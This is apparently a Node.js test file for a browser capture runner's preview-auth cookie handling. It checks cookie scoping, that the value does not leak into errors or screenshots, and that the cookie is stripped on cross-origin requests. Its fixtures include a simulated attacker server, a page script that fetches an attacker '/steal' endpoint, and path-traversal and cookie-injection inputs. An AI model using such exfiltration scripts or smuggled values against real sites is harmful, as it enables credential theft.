import test from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs/promises';
import http from 'node:http';
import path from 'node:path';

import {
  createBrowserRunner,
  createDomAdapter,
  normalizePreviewAuth,
} from '../src/index.mjs';
import { findBrowserExecutable } from '../src/browser/discover.mjs';
import { tempDir } from './helpers.mjs';

const browserPath = findBrowserExecutable({});
const hasBrowser = Boolean(browserPath);
const VIEWPORTS = [{ name: 'desktop', width: 800, height: 600, deviceScaleFactor: 1 }];

function listen(server) {
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => resolve(server.address().port));
  });
}

function html() {
  return `<!doctype html><html><head><meta charset="utf-8"><title>auth</title>
<style>#app{width:300px;height:150px} #panel{width:100px;height:50px;background:#2e7d32}</style></head>
<body><div id="app"><div id="panel">OK</div><button id="action">go</button></div></body></html>`;
}

async function startPreviewWithAuth(hash) {
  const requests = [];
  const server = http.createServer((req, res) => {
    requests.push({ url: req.url, cookie: req.headers.cookie || '' });
    const authorized = String(req.headers.cookie || '').split(';')
      .some((part) => part.trim() === `vplay_preview=${hash}`);
    if (!authorized) {
      res.writeHead(401, { 'Content-Type': 'text/plain' });
      res.end('preview requires authentication');
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(html());
  });
  const port = await listen(server);
  return {
    origin: `http://127.0.0.1:${port}`,
    url: `http://127.0.0.1:${port}/p/demo/`,
    requests,
    close: () => new Promise((resolve) => server.close(() => resolve())),
  };
}

async function startAttacker() {
  const hits = [];
  const server = http.createServer((req, res) => {
    hits.push({ url: req.url, cookie: req.headers.cookie || null });
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('ok');
  });
  const port = await listen(server);
  return {
    origin: `http://127.0.0.1:${port}`,
    hits,
    close: () => new Promise((resolve) => server.close(() => resolve())),
  };
}

function adapter() {
  return createDomAdapter({
    id: 'auth',
    viewports: VIEWPORTS,
    readySelector: '#app',
    interactiveSelector: '#action',
    expectedHitId: 'action',
  });
}

test('normalizePreviewAuth is strict and scopes the cookie to origin+path', () => {
  const hash = 'a'.repeat(64);
  const auth = normalizePreviewAuth({ value: hash, path: '/p/demo/' }, 'http://127.0.0.1:8788/p/demo/');
  assert.equal(auth.name, 'vplay_preview');
  assert.equal(auth.url, `http://127.0.0.1:8788/p/demo/`);
  assert.equal(auth.path, '/p/demo/');
  assert.equal(auth.sameSite, 'Strict');
  assert.equal(auth.httpOnly, true);
  assert.equal(auth.secure, false);

  for (const bad of [
    { value: '' },
    { value: 'a;b' },
    { name: 'bad name', value: hash },
    { value: hash, path: '../evil/' },
    { value: hash, path: 'relative' },
  ]) {
    assert.throws(() => normalizePreviewAuth(bad, 'http://127.0.0.1:8788/p/demo/'), (error) => {
      assert.equal(error.code, 'PREVIEW_AUTH_INVALID');
      assert.equal(String(error.message).includes(hash), false, 'error must not echo the value');
      return true;
    });
  }
  assert.throws(
    () => normalizePreviewAuth({ value: hash }, 'file:///tmp/x'),
    (error) => error.code === 'INVALID_PREVIEW_URL',
  );
});

test('injected cookie opens a protected preview; value never reaches results or PNG', { skip: !hasBrowser }, async (t) => {
  const key = 'e07-package-preview-key';
  const hash = crypto.createHash('sha256').update(key).digest('hex');
  const server = await startPreviewWithAuth(hash);
  const out = await tempDir('e07-auth-');
  t.after(() => server.close());

  const runner = createBrowserRunner({ executablePath: browserPath, previewAuth: { value: hash, path: '/p/demo/' } });
  const capture = await runner.runCapture({ url: server.url, adapter: adapter(), outDir: out, captureId: 'ok' });
  assert.equal(capture.ok, true);
  assert.equal(capture.previewAuth.injected, true);
  assert.equal(JSON.stringify(capture).includes(hash), false, 'hash in capture result');

  const png = await fs.readFile(capture.screenshots[0].path);
  assert.equal(png.includes(Buffer.from(hash)), false, 'hash rendered into the screenshot');
  assert.ok(server.requests.some((request) => request.cookie.includes(`vplay_preview=${hash}`)));
});

test('wrong cookie fails without leaking the value, and cross-origin gets no cookie', { skip: !hasBrowser }, async (t) => {
  const key = 'e07-package-preview-key-2';
  const hash = crypto.createHash('sha256').update(key).digest('hex');
  const server = await startPreviewWithAuth(hash);
  const out = await tempDir('e07-auth-bad-');
  t.after(() => server.close());

  const runner = createBrowserRunner({ executablePath: browserPath, previewAuth: { value: 'wrong-value-123' } });
  const fastFail = {
    id: 'auth',
    viewports: VIEWPORTS,
    async ready(page) {
      await page.waitForSelector('#app', { state: 'visible', timeout: 1200 });
    },
    async assert() {
      return [];
    },
  };
  await assert.rejects(
    () => runner.runCapture({ url: server.url, adapter: fastFail, outDir: out, captureId: 'bad' }),
    (error) => {
      assert.equal(String(error.message).includes('wrong-value-123'), false);
      return true;
    },
  );

  const attacker = await startAttacker();
  t.after(() => attacker.close());
  const pageHtml = `<!doctype html><html><body><div id="app">x</div>
  <button id="action">go</button>
  <script>fetch('${attacker.origin}/steal').catch(()=>{});</script></body></html>`;
  const leakServer = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(pageHtml);
  });
  const port = await listen(leakServer);
  t.after(() => new Promise((resolve) => leakServer.close(() => resolve())));
  const good = createBrowserRunner({ executablePath: browserPath, previewAuth: { value: hash } });
  // Allow the attacker origin explicitly: the guard must strip cookies there.
  await good.runCapture({
    url: `http://127.0.0.1:${port}/p/demo/`,
    adapter: adapter(),
    outDir: out,
    captureId: 'leak',
    allowedExtraOrigins: [attacker.origin],
  });
  assert.equal(attacker.hits.length, 1);
  assert.equal(attacker.hits[0].cookie, null, 'preview cookie must not be sent cross-origin');
});
